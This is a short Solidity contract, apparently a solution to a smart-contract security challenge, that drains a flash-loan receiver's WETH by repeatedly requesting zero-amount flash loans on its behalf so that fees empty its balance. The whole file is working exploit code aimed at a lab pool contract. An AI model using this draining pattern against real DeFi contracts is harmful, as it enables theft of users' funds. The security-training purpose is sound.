// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {NaiveReceiverPool} from "../src/NaiveReceiverPool.sol";
import {IERC3156FlashLender, IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IHasTrustedForwarder} from "../src/BasicForwarder.sol";

contract RescueExploit is IHasTrustedForwarder {
    NaiveReceiverPool public immutable pool;
    address public immutable victim;

    constructor(address _pool, address _victim) {
        pool = NaiveReceiverPool(_pool);
        victim = _victim;
    }

    function trustedForwarder() external view override returns (address) {
        return msg.sender;
    }

    function attack() external {
        address token = address(pool.weth());
        while (IERC20(token).balanceOf(victim) > 0) {
            pool.flashLoan(IERC3156FlashBorrower(victim), token, 0, "");
        }
    }
}
